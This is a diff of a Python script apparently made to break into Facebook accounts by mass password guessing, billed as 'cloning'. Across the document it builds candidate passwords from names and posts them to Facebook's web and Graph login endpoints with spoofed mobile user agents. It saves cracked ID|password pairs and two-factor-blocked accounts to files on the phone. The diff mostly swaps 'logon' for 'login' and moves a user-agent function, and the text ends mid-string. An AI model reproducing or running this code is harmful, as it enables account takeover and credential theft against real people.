@@ -335,7 +335,7 @@ logo =(f"""
    ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ \033[1;34m ᴾᴿᴼ0
 \033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \033[1;32m[\033[1;31m✓\033[1;32m] Author     : SUMON ROY
-\033[1;32m[\033[1;31m✓\033[1;32m] ABOUTS     : a script designed to attempt logons
+\033[1;32m[\033[1;31m✓\033[1;32m] ABOUTS     : a script designed to attempt logins
 \033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;36mFile × \033[1;36mRandom 
 \033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 
@@ -420,7 +420,7 @@ def SUMON_time():
 class Process:
     def __init__(self):
         self.cc=[]
-        #self.key="ATOM-"+ base64.b16encode(str(os.getuid()).encode()).decode() + hashlib.md5((''.join([platform.version(), str(os.getuid()), platform.platform(), os.getlogon(), platform.release()]).replace(' ', '').encode())).hexdigest()
+        #self.key="ATOM-"+ base64.b16encode(str(os.getuid()).encode()).decode() + hashlib.md5((''.join([platform.version(), str(os.getuid()), platform.platform(), os.getlogin(), platform.release()]).replace(' ', '').encode())).hexdigest()
         self.key=""
         self.clear()
         r = self.Gex('https://pastebin.com/raw/uhce1AGG')
@@ -458,7 +458,7 @@ def menu():
     print("[1] FILE   CLONING =>")
     print("[2] RANDOM CLONING =>")
     print("[3] PUBLIK CLONING =>")
-    print("[4] CP RE-logoN    =>")
+    print("[4] CP RE-login    =>")
     print("[5] CONTACT (WHATSAPP) ")
     print("[6] EXIT TOOL ")
     linex()
@@ -968,7 +968,7 @@ def SUMONCP():
 
         print(f"{green}[{rad}+{green}] PROCESS COMPLETE.")
         linex()
-        input("PRESS ENTER TO logoN NEXT ID...")
+        input("PRESS ENTER TO login NEXT ID...")
 
 def ____PO_CO____():
     version_choices = ['14', '15', '10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', '8.0.0', '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', '6.0.1', '9.0.1']
@@ -981,6 +981,15 @@ def ____PO_CO____():
     ver2 = str(random.choice(range(57, 77))) # Corrected range
     return (f'Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) '
             f'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36')
+
+def UA():
+    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
+    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
+    b = ";[FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux;  U; Android 10.0.1; SM-A520W Build/SKQ1.210216.001) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/135374479;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBDV/SM-A520W;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1440};FB_FW/1;][FBAN/FB4A;FBAV/20.0.0.4658;FBBV/6841815;[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=1.5,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.5,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E556B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B/DS;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] "
+    c = ";[FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;]Dalvik/2.1.0 (Linux;  U; Android 10.0.1; SM-A520W Build/SKQ1.210216.001) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/135374479;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBDV/SM-A520W;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1440};FB_FW/1;][FBAN/FB4A;FBAV/20.0.0.4658;FBBV/6841815;[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=1.5,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.5,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E556B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B/DS;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] "
+    d = ";[FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]Dalvik/2.1.0 (Linux;  U; Android 10.0.1; SM-A520W Build/SKQ1.210216.001) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/135374479;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBDV/SM-A520W;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1440};FB_FW/1;][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=1.5,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.5,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E556B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B/DS;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;][FBAN/FB4A;FBAV/20.0.0.4658;FBBV/6841815;[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] "
+    ua = a+b+c+d
+    return ua
 
 def freefb(uid, name, pwx, tl):
     global loop
@@ -1003,7 +1012,7 @@ def freefb(uid, name, pwx, tl):
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'email': uid,
-            'logon_source': 'comet_headerless_logon',
+            'login_source': 'comet_headerless_login',
             'next': '',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
@@ -1028,8 +1037,8 @@ def freefb(uid, name, pwx, tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',}
-            twf = "logon approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/logon/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzUwMTgwMjQyLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
+            twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzUwMTgwMjQyLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             log_cookies = Session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
@@ -1045,7 +1054,7 @@ def freefb(uid, name, pwx, tl):
                     oks.append(uid)
                     break
             elif "checkpoint" in log_cookies:
-                if "Enter logon code to continue" in log_cookies:
+                if "Enter login code to continue" in log_cookies:
                     print(f" {cyan}[SUMON-2F] {uid}|{pw}")
                     open("/sdcard/SUMON_file_2F.txt", "a").write(f"{uid}|{pw}\n")
                     twf.append(uid+"|"+pw)
@@ -1079,51 +1088,53 @@ def bapi(uid, name, pwx, tl):
             pw = ps.replace("first", first).replace("last", last).lower()
             secure = str(uuid.uuid4())
             data = {
-                'adid': str(uuid.uuid4()),
-                'format': 'json',
-                'Device_id': str(uuid.uuid4()),
-                'email': uid,
-                'password': pw,
-                'generate_analytics_claims': '1',
-                'community_id': '',
-                'cpl': 'true',
-                'try_num': '1',
-                'family_Device_id': str(uuid.uuid4()),
-                'credentials_type': 'password',
-                'source': 'logon',
-                'error_detail_type': 'button_with_disabled',
-                'enroll_misauth': 'false',
-                'generate_Session_cookies': '1',
-                'generate_machine_id': '1',
-                'currently_logged_in_userid': '0',
-                'locale': 'en_GB',
-                'client_country_code': 'GB',
-                'fb_api_req_friendly_name': 'authenticate',
-                'fb_api_caller_class': 'com.facebook.account.logon.protocol.Fb4aAuthHandler',
-                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
-                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            }
+            'email': uid,
+            'password': pw,
+            'adid': str(uuid.uuid4()),
+            'device_id': str(uuid.uuid4()),
+            'family_device_id': str(uuid.uuid4()),
+            'session_id': str(uuid.uuid4()),
+            'advertiser_id': str(uuid.uuid4()),
+            'reg_instance': str(uuid.uuid4()),
+            'logged_out_id': str(uuid.uuid4()),
+            'locale': 'en_US',
+            'client_country_code': 'US',
+            'cpl': 'true',
+            'source': 'login',
+            'format': 'json',
+            'omit_response_on_success': 'false',
+            'credentials_type': 'password',
+            'error_detail_type': 'button_with_disabled',
+            'generate_session_cookies': '1',
+            'generate_analytics_claim': '1',
+            'generate_machine_id': '1',
+            'tier': 'regular',
+            'currently_logged_in_userid': '0',
+            'fb_api_req_friendly_name': 'authenticate',
+            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+            'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
+            'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
+            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'api_key': '882a8490361da98702bf97a021ddc14d',
+            'sig': '62f8ce9f74b12f84c123cc23437a4a32'}
             headers = {
-                'User-Agent': ua(),
-                'Accept-Encoding': 'gzip, deflate',
-                'Connection': 'close',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Host': 'b-graph.facebook.com', 
-                'X-FB-Net-HNI': str(random.randint(11111,99999)),
-                'X-FB-SIM-HNI': str(random.randint(11111,99999)),
-                'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895', 
-                'X-FB-Connection-Type': 'WIFI',
-                'X-Tigon-Is-Retry': 'False',
-                'x-fb-Session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-Device-group': '5120',
-                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                'X-FB-Request-Analytics-Tags': 'graphservice',
-                'X-FB-HTTP-Engine': 'Liger',
-                'X-FB-Client-IP': 'True',
-                'X-FB-Server-Cluster': 'True',
-                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
-            }
-            url = "https://b-api.facebook.com/auth/logon"
+            'Host': 'graph.facebook.com',
+            'User-Agent': UA(),
+            'Accept-Encoding': 'gzip, deflate',
+            'Accept': '*/*',
+            'Connection': 'keep-alive',
+            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'X-FB-SIM-HNI': str(random.randint(20000,40000)),
+            'X-FB-Net-HNI': str(random.randint(20000,40000)),
+            'X-FB-Connection-Bandwidth': '27181576',
+            'X-FB-Connection-Quality': 'EXCELLENT',
+            'X-FB-Connection-Type': 'MOBILE.LTE',
+            'X-FB-HTTP-Engine': 'Liger',
+            'X-FB-Client-IP': 'True',
+            'X-FB-Friendly-Name': 'authenticate',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Content-Length': '1026'}
+            url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "Session_key" in result:
                 coki = ";".join(i["name"]+"="+i["value"] for i in result["Session_cookies"])
@@ -1173,7 +1184,7 @@ def graph(uid, name, pwx, tl):
             'locale': 'en_US',
             'client_country_code': 'US',
             'cpl': 'true',
-            'source': 'logon',
+            'source': 'login',
             'format': 'json',
             'omit_response_on_success': 'false',
             'credentials_type': 'password',
@@ -1184,7 +1195,7 @@ def graph(uid, name, pwx, tl):
             'tier': 'regular',
             'currently_logged_in_userid': '0',
             'fb_api_req_friendly_name': 'authenticate',
-            'fb_api_caller_class': 'com.facebook.account.logon.protocol.Fb4aAuthHandler',
+            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
             'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
             'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
             'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
@@ -1207,7 +1218,7 @@ def graph(uid, name, pwx, tl):
             'X-FB-Friendly-Name': 'authenticate',
             'Content-Type': 'application/x-www-form-urlencoded',
             'Content-Length': '1026'}
-            url = "https://graph.facebook.com/auth/logon"
+            url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "Session_key" in result:
                 coki = ";".join(i["name"]+"="+i["value"] for i in result["Session_cookies"])
@@ -1229,15 +1240,6 @@ def graph(uid, name, pwx, tl):
     except Exception as e:
         pass     
 
-def UA():
-    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
-    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
-    b = ";[FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux;  U; Android 10.0.1; SM-A520W Build/SKQ1.210216.001) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/135374479;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBDV/SM-A520W;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1440};FB_FW/1;][FBAN/FB4A;FBAV/20.0.0.4658;FBBV/6841815;[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=1.5,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.5,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E556B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B/DS;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] "
-    c = ";[FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;]Dalvik/2.1.0 (Linux;  U; Android 10.0.1; SM-A520W Build/SKQ1.210216.001) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/135374479;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBDV/SM-A520W;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1440};FB_FW/1;][FBAN/FB4A;FBAV/20.0.0.4658;FBBV/6841815;[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=1.5,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.5,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E556B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B/DS;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] "
-    d = ";[FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]Dalvik/2.1.0 (Linux;  U; Android 10.0.1; SM-A520W Build/SKQ1.210216.001) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/135374479;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBDV/SM-A520W;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1440};FB_FW/1;][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=1.5,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.5,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E556B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B/DS;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) 